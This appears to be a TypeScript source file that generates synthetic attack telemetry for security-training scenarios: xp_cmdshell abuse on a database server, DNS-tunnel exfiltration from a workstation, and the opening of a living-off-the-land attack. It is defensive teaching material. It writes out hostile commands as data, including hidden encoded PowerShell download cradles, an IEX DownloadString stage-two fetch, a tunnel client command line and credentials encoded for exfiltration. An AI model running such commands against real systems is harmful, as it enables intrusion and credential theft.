      hostname: "srv-file01", user_email: "svc-mssql@nexacorp.com", src_ip: dbIp,
      mitre_technique: "T1021.002",
      description: "The svc-mssql service account authenticated to srv-file01 via a network logon (Type 3) from srv-db01.",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "srv-file01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserSid": `${SID_PREFIX}-1301`,
        "winlog.event_data.TargetUserName": "svc-mssql",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": "SRV-DB01",
        "winlog.event_data.IpAddress": dbIp,
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\svc-mssql",
        "host.name": "srv-file01",
        "source.ip": dbIp,
        "authentication.protocol": "NTLM",
      },
    },
    {
      id: "evt_kerb_file_share", ts: T(16 * MIN + 12 * SEC),
      source: "ad", vendor: "Windows Security", event_type: "file_access",
      hostname: "srv-file01", user_email: "svc-mssql@nexacorp.com", src_ip: dbIp,
      severity: "medium", mitre_technique: "T1135",
      description: "svc-mssql listed the root of the Finance$ share on srv-file01 from 10.10.40.61.",
      raw: {
        "winlog.event_id": "5145",
        "winlog.channel": "Security",
        "winlog.computer_name": "srv-file01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.SubjectUserName": "svc-mssql",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.IpAddress": dbIp,
        "winlog.event_data.ShareName": "\\\\*\\Finance$",
        "winlog.event_data.RelativeTargetName": "\\",
        "winlog.event_data.AccessMask": "0x1",
        "winlog.event_data.AccessReason": "ReadData (or ListDirectory): Granted by Ownership",
        "event.code": "5145",
      },
    },

    // T+17:55: the attacker runs sqlcmd in the RDP session
    proc("evt_kerb_db_sqlcmd", 17 * MIN + 55 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", sqlcmd, "cmd.exe started sqlcmd.exe in svc-mssql's session on srv-db01."),

    // T+18min: xp_cmdshell PowerShell execution via svc-mssql (T1059.001)
    {
      id: "evt_kerb_08_xp_cmdshell", ts: T(18 * MIN),
      source: "db_monitor", vendor: "IBM Guardium", event_type: "db_query",
      hostname: dbHost, src_ip: dbIp,
      severity: "critical", mitre_technique: "T1059.001", mitre_tactic: "Execution", is_detection: true,
      description: "svc-mssql executed EXEC xp_cmdshell on srv-db01 through sqlcmd; the command is powershell -WindowStyle Hidden with a Base64 -enc argument.",
      raw: {
        "db.vendor": "IBM Guardium",
        "db.type": "mssql",
        "db.instance": "srv-db01",
        "db.name": "master",
        "db.user": "NEXACORP\\svc-mssql",
        "db.statement": `EXEC xp_cmdshell 'powershell -WindowStyle Hidden -enc ${encPayload}'`,
        "db.rows_affected": 0,
        "db.duration_ms": 1200,
        "db.operation": "EXEC",
        "db.object": "xp_cmdshell",
        "db.schema": "sys",
        "client.ip": dbIp,
        "client.application": "SQLCMD",
        "event.action": "xp-cmdshell-exec",
        "event.outcome": "success",
        "user.name": "svc-mssql",
        "host.name": "srv-db01",
        "alert.name": "xp_cmdshell execution",
      },
    },
    // SQL Server hands the command to cmd.exe, which starts the hidden PowerShell.
    proc("evt_kerb_db_xpcmd", 18 * MIN + 1 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", xpCmd, "sqlservr.exe started cmd.exe on srv-db01."),
    proc("evt_kerb_db_ps", 18 * MIN + 2 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", dbPs, "cmd.exe started a hidden PowerShell with an encoded command on srv-db01.",
      { severity: "high", is_detection: true, mitre_technique: "T1059.001" }),

    // T+18min+6s: the database server's first outbound session. A SQL server has no business
    // opening HTTPS to the internet.
    conn("evt_kerb_db_c2", 18 * MIN + 6 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", dbPs, c2Ip, 443,
      "powershell.exe on srv-db01 connected to 91.243.85.117 on TCP/443."),
    {
      id: "evt_kerb_09_db_outbound", ts: T(18 * MIN + 6_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "high", mitre_technique: "T1105", mitre_tactic: "Command and Control",
      hostname: dbHost, src_ip: dbIp, dst_ip: c2Ip, dst_port: 443,
      description: "srv-db01 opened an outbound TCP/443 session to 91.243.85.117, six seconds after the xp_cmdshell call.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": dbIp,
        "data.dstip": c2Ip,
        "data.dstport": "443",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SSL",
        "data.sentbyte": 2_184,
        "data.rcvdbyte": 48_612,
        "data.sessionid": "73318842",
      },
    },
    // The shell stays up: two more sessions to the same address.
    {
      id: "evt_kerb_fw_c2_b1", ts: T(19 * MIN + 30 * SEC),
      source: "firewall", vendor: "FortiGate", event_type: "net_connection", severity: "high",
      hostname: dbHost, src_ip: dbIp, dst_ip: c2Ip, dst_port: 443,
      description: "srv-db01 opened another outbound TCP/443 session to 91.243.85.117.",
      raw: {
        "data.type": "traffic", "data.subtype": "forward",
        "data.srcip": dbIp, "data.dstip": c2Ip, "data.dstport": "443", "data.proto": "6",
        "data.action": "accept", "data.app": "SSL", "data.sentbyte": 3_912, "data.rcvdbyte": 22_140, "data.sessionid": "73319507",
      },
    },
    {
      id: "evt_kerb_fw_c2_b2", ts: T(21 * MIN + 10 * SEC),
      source: "firewall", vendor: "FortiGate", event_type: "net_connection", severity: "high",
      hostname: dbHost, src_ip: dbIp, dst_ip: c2Ip, dst_port: 443,
      description: "srv-db01 opened a third outbound TCP/443 session to 91.243.85.117.",
      raw: {
        "data.type": "traffic", "data.subtype": "forward",
        "data.srcip": dbIp, "data.dstip": c2Ip, "data.dstport": "443", "data.proto": "6",
        "data.action": "accept", "data.app": "SSL", "data.sentbyte": 4_466, "data.rcvdbyte": 31_908, "data.sessionid": "73320318",
      },
    },
  ];

  // The SQL Server service itself, up since the overnight patch window (before the telemetry window).
  const boot: TelemetryEvent[] = [
    { ...proc("evt_kerb_db_boot_services", -9 * 60 * MIN + 3 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", dbServices, "services.exe started on srv-db01 at boot."), user_email: undefined, is_baseline: true },
    { ...proc("evt_kerb_db_boot_sql", -9 * 60 * MIN + 20 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", sqlservr, "services.exe started the SQL Server service (sqlservr.exe) on srv-db01 at boot."), user_email: undefined, is_baseline: true },
  ];
  events.push(...boot);
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Kerberos ticket volume alert for a developer account", events, T, MIN, attackerIp, dbIp, c2Ip };
}

/** Telemetry half of `buildDNSTunnelingScenario`: the events and the story title, no answer key. */
export function dnsTunnelingScenarioEvents() {
  const B = new Date("2026-05-20T14:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const victimHost = "WS-ENG-3301";
  const victimEmail = "a.jones@nexacorp.com";
  const victimIp = "10.100.50.20";
  const resolverIp = "10.10.1.1";
  const c2Domain = "nexus-update-svc.xyz";
  const c2Ip = "193.42.36.58";          // payload server, and the authoritative answer for every tunnel name
  const dnscat2Hash = makeSha256("dnscat2_client_2.4.0");   // the tunnel client (update.exe)
  // powershell.exe is a signed Microsoft binary; the file it downloads is update.exe, so they never share a SHA256.
  const powershellBinaryHash = makeSha256("powershell_exe_system_binary");
  const encDownload = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAzAC4ANAAyAC4AMwA2AC4ANQA4AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAiACwAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdQBwAGQAYQB0AGUALgBlAHgAZQAiACkA";
  const updateSize = 1_187_328;

  // Base32 (RFC 4648, no padding) of a text, and deterministic base32-looking payload labels.
  const B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  const b32Text = (s: string) => {
    let bits = "";
    for (let i = 0; i < s.length; i++) bits += s.charCodeAt(i).toString(2).padStart(8, "0");
    let out = "";
    for (let i = 0; i < bits.length; i += 5) out += B32[parseInt(bits.slice(i, i + 5).padEnd(5, "0"), 2)];
    return out;
  };
  const b32Rand = (seed: string, n: number) => {
    let h = "";
    for (let k = 0; h.length < n * 2; k++) h += makeSha256(`${seed}:${k}`);
    let out = "";
    for (let i = 0; i < n; i++) out += B32[parseInt(h.slice(i * 2, i * 2 + 2), 16) % 32];
    return out;
  };
  /** A tunnel query name: `labels` data labels of 63 characters under data.<c2 domain>. */
  const tunnelName = (seed: string, labels: number) => `${Array.from({ length: labels }, (_, i) => b32Rand(`${seed}:${i}`, 63)).join(".")}.data.${c2Domain}`;
  // The very first tunnel query: three 63-character labels, about 118 bytes of decoded data.
  const firstName = `KNCVGU2JJ5HD2MBRHNEE6U2UHVLVGLKFJZDS2MZTGAYTWVKTIVJD2MFXHI4TPKZ.MRSXG5DBNZ2GK43UGA2DAOBWGC3TFEB2GQ2LOEBRWYK3TUEB2WK4TFONXW4Z3JN.MFRGGZDFMZTWQ2LKNNWG233ONZSXE43UNFXW4ZLUFZSGK5DUOJ2XG5BANVXXA3D.data.${c2Domain}`;
  // The credential line sent first: base32 of "a.jones@nexacorp.com:Spring2026!".
  const credLabel = b32Text("a.jones@nexacorp.com:Spring2026!");

  // Processes of a.jones's session and of the tunnel client.
  const userinit = { name: "userinit.exe", pid: 2504, path: "C:\\Windows\\System32\\userinit.exe", parent_name: "winlogon.exe", parent_pid: 1032, cmdline: "C:\\Windows\\system32\\userinit.exe", user: "NEXACORP\\a.jones", integrity: "medium" as const };
  const explorer = { name: "explorer.exe", pid: 3320, path: "C:\\Windows\\explorer.exe", parent_name: "userinit.exe", parent_pid: 2504, cmdline: "C:\\Windows\\Explorer.EXE", user: "NEXACORP\\a.jones", integrity: "medium" as const };
  const cmdShell = { name: "cmd.exe", pid: 7700, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "explorer.exe", parent_pid: 3320, cmdline: "\"C:\\Windows\\System32\\cmd.exe\"", user: "NEXACORP\\a.jones", integrity: "medium" as const };
  const psPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const ps = { name: "powershell.exe", pid: 7744, path: psPath, parent_name: "cmd.exe", parent_pid: 7700,
    cmdline: `powershell.exe -WindowStyle Hidden -EncodedCommand ${encDownload}`, user: "NEXACORP\\a.jones", integrity: "medium" as const, hash: { sha256: powershellBinaryHash } };
  const updateExe = { name: "update.exe", pid: 4488, path: "C:\\Windows\\Temp\\update.exe", parent_name: "powershell.exe", parent_pid: 7744,
    cmdline: `C:\\Windows\\Temp\\update.exe --dns ${c2Domain} --secret 4f2a9c7e1b30`, user: "NEXACORP\\a.jones", integrity: "medium" as const, hash: { sha256: dnscat2Hash } };
  const cmdRecon = { name: "cmd.exe", pid: 7810, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "update.exe", parent_pid: 4488, cmdline: "cmd.exe /c whoami /all && net user", user: "NEXACORP\\a.jones", integrity: "medium" as const };
  const stagePath = "C:\\Users\\a.jones\\AppData\\Local\\Temp\\cred_export.dat";
  const cmdStage = { name: "cmd.exe", pid: 7822, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "update.exe", parent_pid: 4488,
    cmdline: `cmd.exe /c copy "C:\\Users\\a.jones\\Documents\\vault-export.csv" "${stagePath}"`, user: "NEXACORP\\a.jones", integrity: "medium" as const };

  // ── helpers ──────────────────────────────────────────────────────────────────
  const mde = (id: string, at: number, type: TelemetryEvent["event_type"], p: NonNullable<TelemetryEvent["process"]>, description: string, action: string, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: type,
    hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
    severity: "informational",
    process: p, description,
    raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": action },
    ...over,
  });
  /** A Sysmon 22 (DnsQuery) row of the tunnel client. */
  const dnsQuery = (id: string, at: number, name: string, type: "A" | "TXT", answer: string, description: string, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
    hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
    severity: "medium",
    process: updateExe,
    dns: { query: name, query_type: type, response: answer, rcode: "NOERROR" },
    description,
    raw: {
      "event.code": "22",
      "winlog.provider_name": "Microsoft-Windows-Sysmon",
      "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
      "winlog.event_data.QueryName": name,
      "winlog.event_data.QueryStatus": "0",
      "winlog.event_data.QueryResults": type === "TXT" ? `type: 16 ${answer}` : `type: 1 ${answer};`,
    },
    ...over,
  });
  /** The corporate resolver's own record of the same lookup. */
  const resolver = (id: string, at: number, name: string, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "dns", vendor: "Windows DNS Server", event_type: "dns_query",
    hostname: victimHost, src_ip: victimIp,
    severity: "low",
    dns: { query: name, query_type: "A", response: c2Ip, rcode: "NOERROR" },
    description: `The internal DNS server answered ${victimHost}'s A query for ${name} with ${c2Ip}.`,
    raw: { "dns.question.name": name, "dns.question.type": "A", "dns.response_code": "NOERROR", "dns.resolved_ip": c2Ip, "source.ip": victimIp },
    ...over,
  });
  /** One DNS session from the resolver out to the authoritative server, as PAN-OS logs it when the session ends. */
  const egressDns = (id: string, at: number, sport: number, sent: number, recv: number, elapsed: number, description: string): TelemetryEvent => ({
    id, ts: T(at),
    source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
    src_ip: resolverIp, dst_ip: c2Ip, dst_port: 53, src_port: sport, protocol: "udp",
    severity: "medium",
    network: { bytes_out: sent, bytes_in: recv },
    description,
    raw: {
      "event.action": "allow",
      "source.ip": resolverIp, "destination.ip": c2Ip, "destination.port": "53",
      "pan.app": "dns", "pan.action": "allow", "pan.rule": "ALLOW-DNS",
      "pan.elapsed_time": String(elapsed),
      "network.bytes_out": String(sent), "network.bytes_in": String(recv),
      "action_result": "allow",
    },
  });
  const baselineQuery = (id: string, at: number, name: string, type: "A" | "AAAA", answer: string): TelemetryEvent => ({
    id, ts: T(at), is_baseline: true,
    source: "dns", vendor: "Windows DNS Server", event_type: "dns_query",
    hostname: victimHost, src_ip: victimIp,
    severity: "informational",
    dns: { query: name, query_type: type, response: answer, rcode: "NOERROR" },
    description: `${victimHost} looked up ${name} (${type}), one of its usual developer-tool domains.`,
    raw: { "dns.question.name": name, "dns.question.type": type, "dns.response_code": "NOERROR", "dns.resolved_ip": answer, "source.ip": victimIp },
  });

  const events: TelemetryEvent[] = [
    // ── a.jones's morning: logon and shell ─────────────────────────────────────
    {
      id: "evt_dns_00_logon", ts: T(-5 * 60 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "informational",
      description: "a.jones logged on interactively to WS-ENG-3301.",
      raw: {
        "winlog.event_id": "4624", "winlog.channel": "Security", "winlog.computer_name": victimHost,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "a.jones", "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "2", "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos", "winlog.event_data.WorkstationName": victimHost,
        "winlog.event_data.IpAddress": victimIp, "winlog.event_data.IpPort": "0",
        "event.code": "4624",
      },
    },
    mde("evt_dns_00a_userinit", -5 * 60 * MIN + 6 * SEC, "process_create", userinit, "winlogon.exe started userinit.exe for a.jones's session on WS-ENG-3301.", "ProcessCreated"),
    mde("evt_dns_00b_shell", -5 * 60 * MIN + 12 * SEC, "process_create", explorer, "userinit.exe started explorer.exe for a.jones's session on WS-ENG-3301.", "ProcessCreated"),
    mde("evt_dns_00c_cmd", -60 * SEC, "process_create", cmdShell, "explorer.exe started cmd.exe on WS-ENG-3301.", "ProcessCreated"),

    // ── T+0: PowerShell downloads the tunnel client (T1059.001) ───────────────
    {
      id: "evt_dns_01_download", ts: T(0),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution",
      description: "A hidden, Base64-encoded PowerShell command on WS-ENG-3301 downloaded update.exe and saved it to C:\\Windows\\Temp\\.",
      process: ps,
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "ReportId": "9284471",
      },
    },
    mde("evt_dns_01a_fetch", 2 * SEC, "net_connection", ps, "powershell.exe on WS-ENG-3301 requested http://193.42.36.58/update.exe.", "ConnectionSuccess",
      { dst_ip: c2Ip, dst_port: 80, protocol: "tcp", network: { url: `http://${c2Ip}/update.exe`, method: "GET", bytes_in: updateSize } }),
    {
      id: "evt_dns_01b_fw_fetch", ts: T(2 * SEC),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victimHost, src_ip: victimIp, dst_ip: c2Ip, dst_port: 80, src_port: 51822, protocol: "tcp",
      severity: "low", network: { bytes_out: 612, bytes_in: updateSize },
      description: "WS-ENG-3301 opened an outbound HTTP session to 193.42.36.58 and received 1.2 MB.",
      raw: {
        "event.action": "allow", "source.ip": victimIp, "destination.ip": c2Ip, "destination.port": "80",
        "pan.app": "web-browsing", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTP",
        "pan.elapsed_time": "3", "network.bytes_out": "612", "network.bytes_in": String(updateSize), "action_result": "allow",
      },
    },
    {
      id: "evt_dns_01c_write", ts: T(4 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "medium",
      file: { path: "C:\\Windows\\Temp\\update.exe", sha256: dnscat2Hash, size: updateSize },
      process: ps,
      description: "powershell.exe on WS-ENG-3301 wrote update.exe (1.2 MB) to C:\\Windows\\Temp.",
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "FileCreated" },
    },
    mde("evt_dns_01d_run", 20 * SEC, "process_create", updateExe, "powershell.exe on WS-ENG-3301 started C:\\Windows\\Temp\\update.exe with a domain and a secret on its command line.", "ProcessCreated",
      { severity: "high", mitre_technique: "T1071.004" }),

    // ── T+3min: the tunnel begins ─────────────────────────────────────────────
    // The very first query: three 63-character labels, about 118 bytes of decoded data.
    dnsQuery("evt_dns_02_tunnel_begin", 3 * MIN, firstName, "A", c2Ip,
      `WS-ENG-3301 issued a DNS query whose name packs three 63-character base32 labels (about 118 bytes of decoded data) beneath ${c2Domain}, the first tunnel query from update.exe.`,
      { severity: "high", mitre_technique: "T1071.004", mitre_tactic: "Command and Control" }),
    resolver("evt_dns_srv_01", 3 * MIN, firstName),
    egressDns("evt_dns_fw_newdomain", 3 * MIN + 10 * SEC, 40113, 9_880, 2_104, 41,
      `The firewall logged a DNS session from the internal resolver (10.10.1.1) to ${c2Ip} on port 53, 9.9 KB sent.`),
    mde("evt_dns_process_queries", 3 * MIN + 30 * SEC, "net_connection", updateExe,
      "Defender for Endpoint identified update.exe (PID 4488) as the process generating the high-rate queries to the corporate DNS server.", "ConnectionSuccess",
      { severity: "high", mitre_technique: "T1071.004", dst_ip: resolverIp, dst_port: 53, protocol: "udp" }),
    dnsQuery("evt_dns_02b_tunnel", 4 * MIN + 10 * SEC, tunnelName("t2", 3), "A", c2Ip, "update.exe on WS-ENG-3301 queried another 3-label name under data.nexus-update-svc.xyz."),
    resolver("evt_dns_srv_02", 4 * MIN + 10 * SEC, tunnelName("t2", 3)),
    dnsQuery("evt_dns_02c_tunnel", 5 * MIN + 20 * SEC, tunnelName("t3", 3), "A", c2Ip, "update.exe on WS-ENG-3301 queried a third 3-label name under data.nexus-update-svc.xyz."),
    resolver("evt_dns_srv_03", 5 * MIN + 20 * SEC, tunnelName("t3", 3)),

    // T+6min: DNS query volume spike - 847 queries to the attacker domain in 60 seconds
    {
      id: "evt_dns_03_volume_spike", ts: T(6 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      // Sentinel alert severity is High / Medium / Low / Informational - no "Critical".
      severity: "high", mitre_technique: "T1071.004", mitre_tactic: "Command and Control",
      description: `Microsoft Sentinel correlated 847 DNS queries from WS-ENG-3301 to *.${c2Domain} within 60 seconds.`,
      raw: {
        "AlertName": "DNS query volume anomaly",
        "AlertSeverity": "High",
        "alert.rule.id": "DNS-QRY-001",
        "host.name": victimHost,
        "destination.domain": `*.${c2Domain}`,
        "ExtendedProperties.Number of events": 847,
        "ExtendedProperties.Time window (s)": 60,
        "ExtendedProperties.Average Subdomain Length": "52.3",
        "ExtendedProperties.Max Subdomain Length": "63",
        "ExtendedProperties.Baseline Query Rate": "23",
        "ExtendedProperties.Baseline Subdomain Length": "8",
        "ExtendedProperties.Baseline Subdomain Entropy": "2.1",
        "ExtendedProperties.Deviation Factor": "36.8",
        "ExtendedProperties.Query Types": ["A", "TXT"],
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
        "source.ip": victimIp,
      },
    },

    // T+10min: C2 commands via DNS TXT records, then run by the client
    dnsQuery("evt_dns_04_txt_c2", 10 * MIN, `cmd.${c2Domain}`, "TXT", "d2hvYW1pIC9hbGwgJiYgbmV0IHVzZXI=",
      `WS-ENG-3301 queried cmd.${c2Domain} for a TXT record; the response decodes to whoami /all && net user.`,
      { severity: "high", mitre_technique: "T1071.004", mitre_tactic: "Command and Control" }),
    mde("evt_dns_04a_recon", 10 * MIN + 5 * SEC, "process_create", cmdRecon, "update.exe started cmd.exe with whoami /all && net user on WS-ENG-3301.", "ProcessCreated",
      { severity: "medium", mitre_technique: "T1033" }),
    mde("evt_dns_04b_stage_cmd", 12 * MIN + 40 * SEC, "process_create", cmdStage, "update.exe started cmd.exe to copy vault-export.csv into a Temp file on WS-ENG-3301.", "ProcessCreated"),
    {
      id: "evt_dns_04c_stage_file", ts: T(12 * MIN + 41 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "medium",
      file: { path: stagePath, size: 29_184 },
      process: cmdStage,
      description: "cmd.exe on WS-ENG-3301 wrote cred_export.dat (29,184 bytes) to a.jones's Temp folder.",
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": victimHost, "ActionType": "FileCreated" },
    },

    // T+14min: data begins exfiltrating via DNS subdomains (T1041)
    // The tunnel server answers each data chunk with an A record, so the resolver sees a normal NOERROR.
    dnsQuery("evt_dns_05_exfil_start", 14 * MIN, `${credLabel}.data.${c2Domain}`, "A", c2Ip,
      `WS-ENG-3301 sent a DNS query whose base32 subdomain decodes to a.jones@nexacorp.com:Spring2026!.`,
      { severity: "high", mitre_technique: "T1041", mitre_tactic: "Exfiltration" }),
    resolver("evt_dns_srv_04", 14 * MIN, `${credLabel}.data.${c2Domain}`),
    // Six of the 247 chunk queries: a different 63-character label each time.
    dnsQuery("evt_dns_05a_chunk", 14 * MIN + 30 * SEC, tunnelName("c1", 2), "A", c2Ip, "update.exe on WS-ENG-3301 queried a 2-label name under data.nexus-update-svc.xyz."),
    dnsQuery("evt_dns_05b_chunk", 15 * MIN + 10 * SEC, tunnelName("c2", 2), "A", c2Ip, "update.exe on WS-ENG-3301 queried a second 2-label name under data.nexus-update-svc.xyz."),
    dnsQuery("evt_dns_05c_chunk", 15 * MIN + 50 * SEC, tunnelName("c3", 2), "A", c2Ip, "update.exe on WS-ENG-3301 queried a third 2-label name under data.nexus-update-svc.xyz."),
    egressDns("evt_dns_fw_egress2", 16 * MIN + 5 * SEC, 40871, 188_400, 31_200, 233,
      "The firewall logged a second, longer DNS session from the internal resolver to 193.42.36.58 on port 53, 188 KB sent."),
    dnsQuery("evt_dns_05d_chunk", 16 * MIN + 30 * SEC, tunnelName("c4", 2), "A", c2Ip, "update.exe on WS-ENG-3301 queried a fourth 2-label name under data.nexus-update-svc.xyz."),
    dnsQuery("evt_dns_05e_chunk", 17 * MIN + 10 * SEC, tunnelName("c5", 2), "A", c2Ip, "update.exe on WS-ENG-3301 queried a fifth 2-label name under data.nexus-update-svc.xyz."),
    dnsQuery("evt_dns_05f_chunk", 17 * MIN + 50 * SEC, tunnelName("c6", 2), "A", c2Ip, "update.exe on WS-ENG-3301 queried a sixth 2-label name under data.nexus-update-svc.xyz."),

    // T+18min: 247 queries over four minutes
    {
      id: "evt_dns_06_file_chunks", ts: T(18 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1041", mitre_tactic: "Exfiltration",
      description: `Microsoft Sentinel correlated 247 DNS queries with unique long subdomains from WS-ENG-3301 to data.${c2Domain} over 4 minutes.`,
      raw: {
        "AlertName": "DNS long-subdomain sequence anomaly",
        "AlertSeverity": "High",
        "alert.rule.id": "DNS-SEQ-002",
        "host.name": victimHost,
        "destination.domain": `*.data.${c2Domain}`,
        "ExtendedProperties.Number of events": 247,
        "ExtendedProperties.Time window (s)": 240,
        "ExtendedProperties.Distinct Subdomains": 247,
        "ExtendedProperties.Average Subdomain Length": "126",
        "ExtendedProperties.Example Query": tunnelName("c1", 2),
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
        "source.ip": victimIp,
      },
    },

    // ── Baseline - WS-ENG-3301's normal DNS: developer-tool domains, short names ─────
    baselineQuery("evt_dns_baseline_volume", -10 * MIN, "api.github.com", "A", "140.82.113.6"),
    baselineQuery("evt_dns_baseline_2", -8 * MIN - 20 * SEC, "registry.npmjs.org", "A", "104.16.92.83"),
    baselineQuery("evt_dns_baseline_3", -5 * MIN - 40 * SEC, "code.visualstudio.com", "AAAA", "2606:4700::6810:5e53"),
    baselineQuery("evt_dns_baseline_4", -2 * MIN - 10 * SEC, "marketplace.visualstudio.com", "A", "13.107.42.18"),
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "DNS volume anomaly on an engineering workstation", events, T, MIN, victimIp, c2Domain, c2Ip, dnscat2Hash };
}

/** Telemetry half of `buildLOLBinsScenario`: the events and the story title, no answer key. */
export function lolBinsScenarioEvents() {
  const B = new Date("2026-05-25T11:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const victimHost = "WS-HR-1133";
  const victimEmail = "s.patel@nexacorp.com";
  const victimIp = "10.10.20.77";
  const mailIp = "87.121.84.207";   // the sender's mail server, and pkg-mirror-eu.ru (the certutil download)
  const c2Ip = "5.252.179.55";      // cdn-winupd.ru: the scriptlet, stage 2, the BITS payload and the beacon
  const payloadHash = makeSha256("srvhost_dll_nexacorp_lolbins");
  const certutilHash = makeSha256("certutil_downloaded_update_exe");
  // certutil.exe is a signed Windows binary - it cannot share a hash with the payload it fetched,
  // and the platform teaches hash-based pivoting. Same for rundll32.exe and the DLL it loads.
  const certutilBinaryHash = makeSha256("certutil_exe_system_binary");
  const bitsPayloadHash = makeSha256("bitsadmin_fetched_svchost_update_exe");   // svchost_update.exe, the persistence binary
  const rundll32BinaryHash = makeSha256("rundll32_exe_system_binary");
  const docmHash = makeSha256("hr_policy_update_docm_macro_document");
  const officeDir = "C:\\Program Files\\Microsoft Office\\root\\Office16";
  const docmPath = "C:\\Users\\s.patel\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8K3DM2PQ\\HR_Policy_Update.docm";
  const psPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const stage2Cmd = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')";
  const user = "NEXACORP\\s.patel";
  const task = "NexaCorpHealthCheck";
  const taskCmd = "C:\\ProgramData\\nexacorp\\svchost_update.exe";

  // ── processes ───────────────────────────────────────────────────────────────
  type P = NonNullable<TelemetryEvent["process"]>;
  const mk = (name: string, pid: number, path: string, parent: string, ppid: number, cmdline: string, extra: Partial<P> = {}): P =>
    ({ name, pid, path, parent_name: parent, parent_pid: ppid, cmdline, user, integrity: "medium", ...extra });
  const sys = (name: string, pid: number, path: string, parent: string, ppid: number, cmdline: string): P =>
    mk(name, pid, path, parent, ppid, cmdline, { user: "NT AUTHORITY\\SYSTEM", integrity: "system" });
  const winlogon = { name: "winlogon.exe", pid: 1008 };
  const userinit = mk("userinit.exe", 2744, "C:\\Windows\\System32\\userinit.exe", winlogon.name, winlogon.pid, "C:\\Windows\\system32\\userinit.exe");
  const explorer = mk("explorer.exe", 3280, "C:\\Windows\\explorer.exe", "userinit.exe", 2744, "C:\\Windows\\Explorer.EXE");
